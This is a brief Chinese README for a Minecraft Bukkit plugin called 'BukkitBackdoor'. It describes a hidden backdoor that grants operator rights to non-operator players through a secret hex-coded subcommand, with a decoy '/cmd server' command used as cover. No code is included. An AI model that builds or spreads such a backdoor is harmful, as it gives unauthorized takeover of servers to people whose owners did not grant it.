# BukkitBackdoor

一个Bukkit后门插件，可以为非OP玩家获取OP并隐藏自身。

## Usage

- 主命令：`/cmd`（仅真实玩家）
- 子命令：
  - `/cmd server` 显示一些服务器信息（伪装的命令）
  - `/cmd 5d3e51dc` 为非OP玩家获取OP（仅非OP玩家）
